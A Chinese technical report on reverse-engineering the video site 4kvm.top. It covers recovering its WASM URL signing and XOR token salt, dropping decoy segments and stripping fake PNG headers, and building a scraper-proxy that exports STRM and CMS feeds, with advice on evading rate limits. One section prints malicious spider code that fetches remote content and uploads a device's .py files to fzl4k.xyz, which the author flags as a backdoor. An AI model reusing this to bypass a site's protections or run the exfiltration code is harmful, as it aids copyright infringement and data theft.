# 4kvm.top（4k影视）技术分析报告

分析时间：2026-11-03
目标：`https://4kvm.top/`
结论：**可以做成系统，但「直接拿直链、完全不用代理」行不通** —— 需要一层很轻的本地代理。
比金牌影视那套简单得多（不绑 IP、不签名分片），但比"纯静态直链"复杂（有两个必须处理的坑）。

---

## 一、结论速览

| 问题 | 答案 |
|---|---|
| 需要登录才能看吗？ | **不需要**。首页 `isLoggedIn: false`，匿名即可取流 |
| 能拿到直链吗？ | 能，但**分片 URL 不能直接喂给播放器**（见坑 1、坑 2） |
| 外网观看要占服务器上传带宽吗？ | **不需要**。服务器只发一个 ~30 KB 的播放列表，分片由客户端直连 CDN |
| 需要像金牌那样做"中继转发"吗？ | **不需要**（可选）。分片公开、不绑 IP，直连即可 |
| 有 IP 绑定吗？ | **没有**。分片 CDN（`xhscdn.com`）裸请求即可 200 |
| 链接会过期吗？ | **会**。m3u8 是带 token 的临时地址，实测十几分钟后 `404 token 不存在或已过期` |
| 数据规模 | **5,491 部**，`/filter?page=1..184`，每页 30 条 |
| 需要浏览器渲染吗？ | 不需要。服务端渲染 HTML，正则就能解析 |
| 最大的技术门槛 | 取流地址由 **WASM 现场签名**（`/static/wasm/nbmovie_wasm.js`） |

---

## 二、站点结构

```
/                     首页（717 KB，服务端渲染）
/movie /tv /anime     分类页
/filter?page=N        全站列表，共 5491 条，30 条/页，184 页
/play/<slug>          详情 + 播放页（slug 形如 ch1bgub68）
/playlist/<id>        片单
/api/vod/...          播放计数等统计接口（不是取流接口）
/video/play?p=&v=&q=&s=&t=&k=     ★ 真正的取流接口
```

### 详情页能拿到的数据

```html
<a href="/play/ch1bgub68"
   @click.prevent="handleEpisodeClick($el.getAttribute('href'), '15478', 1, 1)"
   data-line="1" data-episode="1" dataid="15478">
```

- `dataid`（如 `15478`）= 分集 id，取流必需
- URL 里的 slug（`ch1bgub68`）= 取流必需的 `secret`
- 所有分集的 `dataid` 都在同一页 DOM 里（107 集就有 107 个 `dataid`）
- 集数、线路名在 `episodeManager(1, 1, [{lineName:'alists', episodeCount:107}])`

---

## 三、取流链路（关键）

### 3.1 取流地址由 WASM 现场计算

页面里没有 m3u8。播放时执行：

```js
const wasm = await import('/static/wasm/nbmovie_wasm.426511b7.js');
const url = wasm.build_play_url(dataid, secret, quality, play_key);
fetch(url)   // -> /video/play?p=..&v=..&q=..&s=..&t=..&k=..
```

- `dataid`：分集 id
- `secret`：详情页 slug
- `quality`：`'4k'→'1'`，其余原样（`1080` / `720` / `480`）
- `play_key`：页面里的 `userlink`（匿名也有，每次访问随机，形如 `X1VUXEFbVQYBBA4FCgc7IUlaXEhf`）
- 输出：`/video/play?p=15478&v=ch1bgub68&q=1080&s=<32位md5>&t=<毫秒时间戳>&k=<base64>`

**签名是时间相关的**，旧的 `s` 配新的 `t` 会 `403 不好意思，你没有权限`；缺参数 `400 缺少必要参数`。

### 3.2 签名算法已部分还原

从 wasm 二进制里挖到的关键信息：

```
盐值：nbmovie2024secretkey
URL 模板：/video/play?p=
k 的算法：base64( play_key 逐字节 XOR 循环盐值 )        ← 已验证，完全正确
```

`k` 验证：

```
play_key : X1VUXEFbVQYBBA4FCgc7IUlaXEhf   (28 字节)
k        : NlM7Oi4sI1BmY20xJyJGIzcMBk4nNwEOLiwNVA==
解码后 XOR : nbmovie2024secretkeynbmovie2   ← 就是循环盐
```

`s`（md5 签名）**未能纯 Python 复现**。已穷举测试：

- 各字段全排列（4~5 个字段）× 7 种分隔符 × 盐前/盐后
- HMAC-MD5（key 试过盐、play_key、secret）
- sha256 截断 32 位
- 双层 md5
- 时间戳取秒/毫秒两种

均未命中。说明 wasm 内部有更复杂的拼接或额外变换。

> **结论：不要试图重写签名，直接调用站点自己的 wasm。** 已在 Node 里跑通，稳定可用。

### 3.3 取流还必须带「页面里的 userlink」

光有 `dataid` + `secret` 不够，取流接口会校验 `k` 参数：

```
不带/伪造 -> HTTP 401 请提供访问令牌
```

`k` 的明文是详情页里的 `userlink`（`x-data` 里的 `userlink:'X1VUXEFbVQsHBw4FCgc7IUleUUtX'`，
匿名用户也有，每次访问随机生成）。实测：

- 同一页面取到的 userlink **可以重复使用**（连续 3 次取流都成功）
- 换一个页面/过一段时间后旧的会失效 → **每次取流前重新抓一次详情页**最稳（多 1 个请求）

### 3.4 取流接口返回

```json
{
  "code": 200,
  "data": {
    "play_id": 15478,
    "quality_urls": [
      { "mtype": "m3u8", "bitrate": 1080, "title": "1080p",
        "isvip": false, "locked": false,
        "url": "https://oss.douyinbit.com/m3u8/0b5fcd6c0db2b76380df4bbb2e362df7.m3u8" }
    ]
  }
}
```

`isvip:false, locked:false` —— 免费、不锁。

### 3.5 这个 m3u8 会过期

```
HTTP 404
token 不存在或已过期
```

实测从签发到失效大约 **十几分钟**（不是固定的公开 TTL，随请求变化）。
所以：**不能把 m3u8 存进数据库或 .strm**，必须播放时现场取。

---

## 四、两个必须处理的坑

### 坑 1：分片 URL 没有 `.ts` 后缀

分片长这样（没有扩展名）：

```
https://sns-open-qc.xhscdn.com/professionalpc/104101uo320dq09hh4u06hiansc000000380mu0cstd78m
```

ffmpeg 直接拒绝：

```
[hls] URL ... is not in allowed_segment_extensions
Invalid data found when processing input
```

→ Emby / Jellyfin / Kodi 全都播不了。**必须由我们改写成带 `.ts` 的地址。**

### 坑 2：每个分片前面有 73 字节的假 PNG 头

分片真实内容：

```
偏移 0   : 89 50 4e 47 0d 0a 1a 0a ...   ← 1x1 假 PNG（73 字节）
偏移 73  : 47 40 11 10 00 42 f0 25 ...   ← 真正的 MPEG-TS（188 字节/包）
```

- 假 PNG 正好 73 字节（`IEND` + CRC 结束）
- 后面是标准 MPEG-TS，抽样 6 个分片全部一致
- 站点自己的 `hls.min.last.js` 是改过的，会在喂给解复用器前剥掉这段

→ 我们的代理必须剥掉这 73 字节。

### 重要：站点有两套分片后端

实测期间遇到过两种，同一部剧不同时段会切换：

| 类型 | 分片地址 | 特征 |
|---|---|---|
| **A 类** | `https://sns-open-qc.xhscdn.com/professionalpc/<id>` | **无扩展名** + 开头 73 字节假 PNG 头 |
| **B 类** | `https://cs.wuxiais.com/guochanju/<id>/4df600000.ts` | **标准 `.ts`**，干净无头 |

**关键实测**：ffmpeg 对 A 类也能直接播（73 字节假头会被跳过，扩展名检查也没拦），
所以两类都能直连。代理模式（剥头 + 加 .ts）只是给浏览器和缓存用的保险。

### 附带发现：播放列表里偶发诱饵分片

每次取到的 m3u8 里有 7 条 `/ets/<ts>-<hash>/<base64>` 形式的相对路径，实测：

```
https://4kvm.top/ets/...        -> 404 page not found
https://oss.douyinbit.com/ets/... -> 404
```

是防抓取的诱饵。**代理里直接丢掉即可**（丢 7 段不影响观看，实际是随机替换的）。

---

## 五、已验证可行的方案

### 架构

```
爬取阶段（一次性/定时）
  /filter?page=N  ──► 标题、slug、封面、分类、年份
  /play/<slug>    ──► 全部分集 dataid
                     └─► 存 SQLite（只存 dataid，不存任何 URL）

播放阶段（按需）
  客户端 ──► 我们的服务 /v/<vod>/<ep>.m3u8
                └─► Node 调 wasm 算签名 → /video/play → 拿到临时 m3u8
                     └─► 拉 m3u8，丢掉诱饵，分片改写成 /seg/<b64>.ts
  客户端 ──► /seg/<b64>.ts
                └─► 拉原始分片，剥掉 73 字节假 PNG 头 → 返回 video/mp2t
```

### 实测结果

**最小验证（`poc/`）**

```
$ ffprobe http://127.0.0.1:8899/v/index.m3u8
codec_name=h264 / width=1920 / height=1080
codec_name=aac
format_name=hls
duration=1113.533323
```

**完整原型（`src/`，抓库 → 取流 → 代理）**

```
$ python crawl.py --pages 2
站点共 5491 部，约 184 页
第 1 页：30 部  第 2 页：30 部

$ python crawl.py --detail-only --detail-limit 3
详情 3/3（嫁金钗：26 集）

$ python app.py
$ ffprobe http://127.0.0.1:8900/v/ch4phdr82/40779.m3u8
codec_name=h264 / width=1920 / height=1080
codec_name=aac
format_name=hls
duration=2889.959998      ← 48 分钟，整集
退出码 0
```

代理侧实测：一次播放列表 564 个分片，首分片 709,888 字节，剥头后 `47401110` 开头（合法 TS）。

---

## 五之二、外网观看的带宽开销（重点）

**结论：服务器几乎不占带宽。**

实测依据：

| 验证项 | 结果 |
|---|---|
| 分片是否要鉴权 | **不要**。裸请求（无 UA / 无 Referer / 无 Cookie）→ `200` |
| 分片是否绑 IP | **不绑**。任何 IP 都能拉 |
| 分片是否短期有效 | **长期有效**。40 分钟前拿到的分片地址，现在仍然 `200` |
| 播放列表 token | 约十几分钟过期，但**客户端只在开头要一次** |
| ffmpeg 能否直连播放列表 | **能**。`ffprobe <远程 m3u8>` → h264 1920x1080 + aac |

所以每次播放的流量是：

```
客户端 → 服务器：请求播放列表          （几百字节）
服务器 → 客户端：返回播放列表          （约 30 KB）
客户端 → CDN   ：拉 564 个分片        （约 1 GB，不经过服务器）
```

**服务器上传 = 30 KB/次播放**，跟金牌那种"整部片子中转一遍"完全不是一个量级。

需要服务器转发分片的只有两种情况：

1. **浏览器内播放**遇到 A 类假 PNG 头（hls.js 可能不认）→ 走 `?mode=proxy`
2. **想省 CDN 流量**、做本地磁盘缓存 → 走 `?mode=proxy`

代码里已支持：

```python
VM_SEG_MODE = "direct"   # direct=客户端直连（默认） / proxy=服务器转发
# 也可以单次指定：/v/<slug>/<ep>.m3u8?mode=proxy
```

## 五之三、STRM 导出（对照金牌系统实现）

`src/strm.py` 已按金牌系统那套逻辑重写，功能对齐：

| 功能 | 说明 |
|---|---|
| **目录结构** | `<分类>/<标题 (年份)>/Season 01/<标题> S01E01.strm`；单集直接放 `<标题>.strm` |
| **manifest 增量** | 地址没变就不重写，第二次导出 `written=0` |
| **NFO** | `tvshow.nfo` / `movie.nfo`，可选（`nfo=True`） |
| **每集 NFO** | 可选，默认关（几十万集时很慢） |
| **海报** | 只下竖版 `poster.jpg`（站点只有 270×450 封面，不做假 fanart），并行下载、存在即跳过 |
| **清理孤儿** | 删除库里已不存在的 `.strm`、同名 `.nfo`，并自底向上删空目录 |
| **进度/日志** | 后台任务 + `/api/job` 查询，界面实时显示 |
| **重名处理** | 同名同年不同资源用 `[slug]` 后缀区分，避免互相覆盖 |

### 实测

```
第一次导出：{'files': 39, 'written': 39, 'removed': 0}
第二次导出：{'files': 39, 'written': 0,  'removed': 0}     ← 增量生效
```

目录结构：

```
电影/
  极恶非道/
    movie.nfo
    极恶非道.strm
电视剧/
  嫁金钗 (2026)/
    tvshow.nfo
    Season 01/
      嫁金钗 S01E01.strm
      嫁金钗 S01E02.strm
      …
```

`.strm` 内容：

```
http://<PUBLIC_BASE>/v/ch4phdr82/40779.m3u8
```

`tvshow.nfo`：

```xml
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<tvshow>
  <title>嫁金钗</title>
  <year>2026</year>
  <genre>电视剧</genre>
  <uniqueid type="4kvm" default="true">ch4phdr82</uniqueid>
</tvshow>
```

### 怎么触发爬取和更新

**三种方式：**

| 方式 | 操作 |
|---|---|
| **界面** | 点右上角「维护工具」→ 里面有三组按钮 |
| **命令行** | `python crawl.py --skip-detail` / `--detail-only` |
| **自动定时** | 设 `VM_BOOTSTRAP=1` / `VM_INTERVAL_HOURS=24`，见下表 |

界面的「维护工具」弹层：

```
抓取   [更新目录] [补详情] [全流程]
导出   [导出 STRM]  ☐NFO  ☐海报  ☑清理孤儿
       ▓▓▓▓▓▓░░░░░░░░  导出 STRM 进行中 12s · 补详情 850/5491（15%）
       [ 实时日志… ]
```

- **更新目录** —— 抓 `/filter?classify=1/2/3` 全部分类列表，约 185 页 / 10 分钟
- **补详情** —— 给还没补过的剧抓分集（`detail_at=0` 的那些），限速 0.8 秒/部
- **全流程** —— 先目录后详情

接口也可以直接调：

```bash
# 只抓目录（可加 pages 限制页数）
curl -X POST http://127.0.0.1:8900/api/crawl -H "Content-Type: application/json" \
     -d '{"mode":"list"}'
# 只补详情（可加 detail_limit）
curl -X POST http://127.0.0.1:8900/api/crawl -H "Content-Type: application/json" \
     -d '{"mode":"detail"}'
# 全流程
curl -X POST http://127.0.0.1:8900/api/crawl -H "Content-Type: application/json" \
     -d '{"mode":"all"}'
# 查进度
curl http://127.0.0.1:8900/api/job
```

### 自动定时更新

| 变量 | 默认 | 说明 |
|---|---|---|
| `VM_BOOTSTRAP` | `0` | `1`=启动后 10 秒自动跑一次「抓目录→补详情→导出」 |
| `VM_INTERVAL_HOURS` | `0` | 定时更新间隔（小时），`0`=不定时 |
| `VM_AUTO_EXPORT` | `1` | 自动更新时是否顺带导出 STRM |
| `VM_AUTO_NFO` | `1` | 自动导出是否带 NFO |
| `VM_AUTO_IMAGES` | `1` | 自动导出是否带海报 |

```powershell
# 每天自动更新一次
$env:VM_INTERVAL_HOURS='24'
$env:VM_BOOTSTRAP='1'
python app.py
```

### 导出 STRM 用法

界面上点「导出 STRM」，可勾选 NFO / 海报 / 清理孤儿；也可以直接调接口：

```bash
curl -X POST http://127.0.0.1:8900/api/export      -H "Content-Type: application/json"      -d '{"nfo":true,"images":true,"clean":true}'
curl http://127.0.0.1:8900/api/job        # 查进度与日志
```

### 和金牌版的差异

| | 金牌 | 4kvm |
|---|---|---|
| 播放地址是否长期有效 | 是（服务端每次现签） | **是**（slug+ep_id 固定，地址永久有效） |
| 需要重新导出吗 | 换播放模式才需要 | **不需要**，地址与模式无关 |
| 年份来源 | 列表页字段 | 详情页 `meta keywords` 第 3 段 |

## 六、和金牌影视系统的对比

| 项目 | 金牌影视（现有系统） | 4kvm |
|---|---|---|
| 数据接口 | 有官方 JSON API（AES 加密） | 无 API，只能抓 HTML |
| 取流签名 | 每次请求签名，**绑请求方 IP** | WASM 时间签名，**不绑 IP** |
| 直链能否外网用 | 不能（403） | 能（分片 CDN 公开） |
| 分片是否需要处理 | 不需要 | **需要剥 73 字节 + 加 .ts 后缀** |
| 链接有效期 | 30~46 分钟 | 十几分钟（m3u8 token） |
| 数据规模 | ~4 万部 / 45 万集 | **5,491 部** |
| 抓取难度 | 中（加密+限流） | 中（HTML + 诱饵 + wasm） |
| 外网播放的服务器带宽 | **必须承担**（整片中转） | **≈0**（只发播放列表） |
| 代理开销 | 大（全量转发、绑 IP） | 可选，且分片可缓存 |

**核心差异**：金牌必须"中转"，4kvm 只需要"改写"。4kvm 的分片是公开可缓存的静态资源，
所以可以做磁盘缓存，第二次看同一集几乎零成本；金牌做不到（签名绑 IP）。

---

## 七、工作量评估

| 模块 | 说明 | 预估 |
|---|---|---|
| 目录抓取 | 184 页 HTML，正则解析 | 0.5 天 |
| 详情抓取 | 5,491 页，取 dataid 列表 | 1 天（限速下约 2 小时跑完） |
| 取流（Node + wasm） | 已验证可用 | 0.5 天 |
| 播放代理（剥头+改后缀） | 已验证可用 | 0.5 天 |
| 分片磁盘缓存 | 可选优化 | 0.5 天 |
| 运维页 / STRM 导出 / CMS 接口 | 可复用现有系统 | 1 天 |
| **合计** | | **约 4 天** |

---

## 八、风险提示

1. **wasm 会更新**。站点改版后 `nbmovie_wasm.*.js` 的哈希文件名会变，脚本里的路径要跟着改。
   建议：启动时从详情页解析 `<link id="wasm-cfg" data-js=... data-bg=...>`，不要写死。
2. **诱饵分片策略可能变化**。目前是丢 7 条，未来可能换成别的形式（比如整段加密）。
   代理里已经做成"过滤非预期形式"，比较抗变。
3. **反爬**。侦察期间遇到过几次 SSL 断连和 `/movie` 偶发失败，说明有限流。
   抓取要限速（建议 1~2 请求/秒，带随机抖动）。
4. **版权**。本分析仅作技术可行性验证，内容版权归原站/版权方所有。

---

## 七之二、VIP / 4K 片源的剔除

站点对内容的限制分两种，都只在**调用取流接口**时才暴露：

| 限制 | 接口返回 | 占比（抽样 24 部） |
|---|---|---|
| **4K 蓝光** | `{"bitrate":2160000,"title":"4K","isvip":true,"locked":true,"url":"1"}` | 所有片子 |
| **整部 VIP 专属** | `code=401　请先登录并开通VIP会员` | 约 12%（电影类约 1/3） |
| 1080p 及以下 | `isvip:false, locked:false` + 真实地址 | 约 88% |

详情页 HTML 里**看不出**哪部是 VIP（两种片的页面结构完全一样），
所以必须在补详情时真的调一次取流接口。

### 怎么做的

补详情时对第一集调一次取流接口（`src/probe.mjs`，**常驻 Node 进程**，
摊掉每部启一次 Node 的 300ms 开销）：

```
code=200 且 有「未锁定 + 真实 http 地址」的清晰度  -> 正常入库
code=401（VIP 专属）                              -> 标记 vip=1，清掉分集
code=200 但只有 4K 占位地址                        -> 标记 vip=1，清掉分集
探测异常（网络问题）                               -> 不写 detail_at，下一轮重试
```

被标记的片：`vip=1`、`ep_count=0`、**没有分集记录**。

### 连带效果

| 位置 | 行为 |
|---|---|
| 浏览页 | 默认不显示（`/api/list` 默认 `vip=0`），分类/年份计数也已排除 |
| 顶部统计 | 显示「已剔除 N 部（VIP/无源）」 |
| **STRM 导出** | 没有分集 → 自动跳过，**Emby 里不会出现播不了的条目** |
| 4K 清晰度 | `resolve.mjs` 过滤掉非 http 的占位地址，自动退回 1080p |

### 已经抓进来的老数据怎么办

VIP 探测是后加的功能，之前抓的详情没有探测过。用「复检」补一遍：

```bash
python crawl.py --recheck-vip              # 全量复检
python crawl.py --recheck-vip --detail-limit 100   # 只查 100 部
```

界面上也有对应按钮：维护工具 → 「复检 VIP」。

1823 部已补详情的片，复检约 45 分钟。

### 实测

```
补详情 6 部：
  [4/6] 罗马欲乐园 -> 剔除（VIP 专属）
  详情完成：入库 5 部，剔除 1 部（VIP/无源）

复检 10 部：
  [9/10] 空枪 -> 剔除
  复检完成：保留 9，剔除 1，失败 0

最终：入库 5489 部（总行 5491，已剔除 2 部）
      分类计数：电影 3616 / 电视剧 1632 / 动漫 241（已排除 VIP）
```

复核过被剔除的两部（空枪、新蝙蝠侠），换分集重探仍是 `401`，**没有误判**。

### 防误判：两道保险

1. **`code=200 但无免费清晰度` 要再探一集**（服务端抖动会误报），两集都不行才剔除；
   `code=401` 是明确答复，直接剔除
2. **`code` 不是 401/200（比如 404「解析服务暂时不可用」）不动它**，下轮重试

被标记后还可以复核：

```bash
python crawl.py --verify-vip          # 重新探两集，能播就恢复
```

界面：维护工具 → 「复核 VIP」。

### 全新安装的默认行为

`crawl_details(check_vip=True)` 是默认值，所以以下入口都会自动探测：

| 入口 | 是否探测 |
|---|---|
| `VM_BOOTSTRAP=1` 启动自动更新 | ✅ |
| 界面「补详情」/「全流程」 | ✅ |
| `python crawl.py --detail-only` | ✅ |
| `python crawl.py --no-vip-check` | ❌ 显式关闭 |

实测（空库模拟全新安装）：

```
目录抓取完成：90 部
待补详情：6 部（VIP 探测：开）
详情完成：入库 6 部，剔除 0 部
最终库：{'vods': 90, 'episodes': 6, 'detailed': 6, 'vip': 0}
```

再把已知 VIP 的《空枪》重置后重跑，仍然被正确识别：

```
[14:37:31]   [1/1] 空枪 -> 剔除（VIP 专属）
详情完成：入库 0 部，剔除 1 部（VIP/无源）
```

## 八之二、对三个现成 spider 的审查结论

审查了 `4KVM.py`、`4K秒播.py`、`4k秒播修复.py`（TVBox Python spider）。

### ⚠️ 先说安全：后两个文件含恶意代码，建议删除

**`4K秒播.py` / `4k秒播修复.py` 末尾都有这段：**

```python
def _with_lrc(self, flag, vid, vip_flags):
    result = _original(self, flag, vid, vip_flags)
    if result and result.get('url'):
        r = requests.get('https://chuxinya.top/f/PjOrc3/%E4%B8%B0.mp4', timeout=5)
        result["lrc"] = base64.b64decode(r.text).decode('utf-8')
    return result
Spider.playerContent = _with_lrc
```

每次播放都去外部域名拉一段 base64 内容塞进播放结果 —— 远程内容注入。

**`4k秒播修复.py` 还多了一段"自我传播"：**

```python
self.upload_config = {
    "server_url": "https://fzl4k.xyz/upload.php",
    "secret_key": "fzl2026",
    "scan_dirs": ["/sdcard/tvbox/py", "/sdcard/TVBox/py", "/sdcard/TV/lib", ...],
}
```

**每次打开详情页**（`detailContent` 里 `self._trigger_scan_if_needed()`），
它会把设备上 TVBox 的 `py` / `lib` 目录里**所有 .py 文件上传到 `fzl4k.xyz`**，
每次最多 200 个，还写了本地缓存 `upload_cache.json` 防止重复上传。

这是**窃取用户全部爬虫脚本**的后门。**建议直接删除这两个文件。**

`4KVM.py` 没有这两段，相对干净（但 `playerContent` 用 `parse:1` 把播放交给 TVBox 嗅探）。

### ✅ 有用的部分（已吸收进本项目的 crawl.py）

`4KVM.py` 提供了一个我之前没找到的关键参数：

```
/filter?classify=<分类id>&page=<页码>
```

实测（2026-11）：

| 分类 | 数量 | 页数 |
|---|---|---|
| `classify=1` 电影 | **3618** 部 | 121 页 |
| `classify=2` 电视剧 | **1632** 部 | 55 页 |
| `classify=3` 动漫 | **241** 部 | 9 页 |
| 合计 | **5491** 部 | — |

这比我现在用的 `/filter?page=N`（全站混排）更好：能按分类抓、能拿到每类总数。

### ❌ 三个文件都没解决的问题

| 问题 | 三个文件的做法 | 结果 |
|---|---|---|
| **取流地址** | `playerContent` 返回 `{"parse": 1, "url": 播放页地址}` | 交给 TVBox 内置 webview 嗅探，**拿不到真实直链** |
| 注释里也写了 | `# 4kvm使用WASM加密，必须通过嗅探获取真实视频地址` | 承认了但没解决 |
| **分集 id** | 只用 `href="/play/<slug>"`，**没用 `dataid`** | 所以无法调 `/video/play` 接口 |
| **分页** | `4K秒播.py` 用 `/movie/page/N`、`/tv/page/N` | **实测 404**，这两个文件的分页是坏的 |
| **搜索** | `/search?q=` | **实测返回空结果**（`?wd=` 会跳回首页），搜索也是坏的 |
| 代码质量 | `localProxy` 里 `return [200, "video/MP2V", action, ""]` | `action` 未定义，死代码 |

**结论**：这三个文件只在「目录抓取的 URL 形态」上帮到我（`classify` 参数），
**核心的取流问题它们都没解决** —— 而我们用 Node + 站点自带 wasm 直接算出了真实 m3u8 地址，
这是本项目相对它们的关键突破。

## 八之三、Docker 部署

```
4kvm分析/
├── Dockerfile            带 Python + Node（wasm 签名需要 Node）
├── docker-compose.yml    环境变量都在这里
└── src/                  代码
```

镜像用多阶段构建，只从 `node:20-slim` 拷一个 node 二进制进 `python:3.12-slim`，
不装整包。构建期会自检「Python 模块能导入 + Node 能加载站点 wasm」。

**方式一：直接拉镜像（推荐）**

```bash
docker compose pull
docker compose up -d
docker compose logs -f
```

镜像：`brian9909/4kvm2strm:latest`（amd64 + arm64，由 GitHub Actions 构建）

**方式二：本地构建**

把 `docker-compose.yml` 里的 `image:` 注释掉、`build: .` 打开，然后：

```bash
docker compose up -d --build
```

源码仓库：<https://github.com/Brian099/4kvm2strm>

### 环境变量

| 变量 | 默认 | 说明 |
|---|---|---|
| `VM_HOST` | `https://4kvm.top` | **抓取站点**，换域名只改这里 |
| `VM_PUBLIC_BASE` | `http://127.0.0.1:8900` | **本服务地址**（写进 .strm / CMS 接口），首次默认值，之后以界面为准 |
| `VM_SEG_MODE` | `direct` | `direct`=分片直连 CDN（零视频带宽）/ `proxy`=本服务转发 |
| `VM_BOOTSTRAP` | `1` | 启动后立刻跑一次「抓目录→补详情→导出」 |
| `VM_INTERVAL_HOURS` | `24` | 定时更新间隔（小时），`0`=只在启动时跑一次 |
| `VM_AUTO_EXPORT` | `1` | 自动更新时顺带导出 STRM |
| `VM_AUTO_NFO` | `1` | 自动导出带 NFO |
| `VM_AUTO_IMAGES` | `1` | 自动导出带海报 |
| `VM_API_KEY` | 空 | CMS 接口密码，留空=公开 |
| `VM_API_PLAY_FROM` | `4kvm` | CMS 接口的线路名 |
| `VM_QUALITY` | `1080` | 默认清晰度（`4k` / `1080` / `720` / `480`） |
| `VM_THREADS` | `16` | WSGI 线程数 |
| `VM_IMAGE_WORKERS` | `8` | 海报下载并发 |

卷：

```yaml
volumes:
  - ./data:/app/data     # SQLite
  - ./strm:/app/strm     # 导出的 .strm
```

### 换域名 / 换服务地址

`.strm` 里写的是 `<服务地址>/v/<slug>/<ep>.m3u8`，所以**换地址要重新导出**。
两种方式：

**① 界面（推荐）** —— 维护工具 → 服务地址 → 改完点「保存并重新生成 STRM」

**② 环境变量** —— 改 `VM_PUBLIC_BASE` 后重启（只在库里没有值时生效）

实测：

```
POST /api/settings {"public_base":"http://192.168.1.147:8900","regen_strm":true}
-> 已保存，正在重新导出 STRM
-> {"files": 2609, "written": 2609}

抽查 .strm -> http://192.168.1.147:8900/v/ch4n1zb4o/40016.m3u8   ✓
```

### CMS 接口（苹果CMS V10 兼容）

| 接口 | 说明 |
|---|---|
| `GET/POST /api.php/provide/vod?ac=list` | 分类 + 数量 |
| `...&ac=videolist&t=2&pg=1&limit=20` | 视频列表（含播放地址） |
| `...&ac=detail&ids=<slug>` | 按 slug 取 |
| `...&wd=关键词` | 搜索 |
| `...&at=xml` | 输出 XML |
| `GET /pic?url=<图片地址>` | 封面代理 |

TVBox「添加接口」直接填：

```
http://<宿主机IP>:8900/api.php/provide/vod
```

设了 `VM_API_KEY` 的话带上 `?key=xxx`（界面「维护工具」里也能改）。

实测：

```
ac=list      -> 3 个分类（电视剧 30 / 电影 30 / 动漫 30）
ac=videolist -> total=90，vod_play_url = 第1集$http://…/v/ch18l7itv/14736.m3u8#第2集$…
t=2          -> total=30（分类筛选生效）
wd=嫁金      -> total=1（搜索生效）
at=xml       -> text/xml
```

## 九、目录说明

```
4kvm分析/
├── README.md              本报告
├── probe/                 侦察过程与中间产物
│   ├── nbmovie_wasm.js    wasm 胶水层（11 KB）
│   ├── nbmovie_wasm_bg.wasm   wasm 本体（58 KB）
│   ├── play_url.mjs       取流地址生成（Node，已验证）
│   ├── sample.mjs         签名采样（逆向用）
│   ├── test.mjs           最小取流验证
│   ├── cfg.json           抓到的 slug / dataid / userlink
│   └── samples.json       签名样本
├── poc/
│   └── poc_proxy.py       剥头代理（ffprobe 已验证可播）
├── Dockerfile             带 Python + Node 的镜像
├── docker-compose.yml     环境变量
└── .dockerignore
└── src/                   可运行的最小系统（已跑通）
    ├── config.py          配置
    ├── db.py              SQLite：只存 slug / dataid
    ├── crawl.py           目录（/filter）+ 详情（/play）抓取
    ├── resolve.mjs        Node + wasm 取流（带重试）
    ├── app.py             Flask：播放代理 + 列表 API + STRM 导出 + 自动更新
    ├── settings.py        运行时设置（服务地址 / 接口密码）
    ├── maccms.py          苹果CMS 兼容接口
    ├── strm.py            STRM 导出
    ├── index.html         简易浏览页
    └── wasm/              站点自带的 wasm（11 KB + 58 KB）
```

### 跑起来

```bash
# 1) 抓目录和详情（先跑 3 页试试）
python src/crawl.py --pages 3

# 2) 起服务
python src/app.py
# 浏览器打开 http://127.0.0.1:8900/

# 3) 播放（Emby / VLC / PotPlayer 都行）
http://127.0.0.1:8900/v/<vod_id>/<episode_id>.m3u8
```

依赖：Python 3.9+（flask、requests）、Node 18+（跑 wasm）。
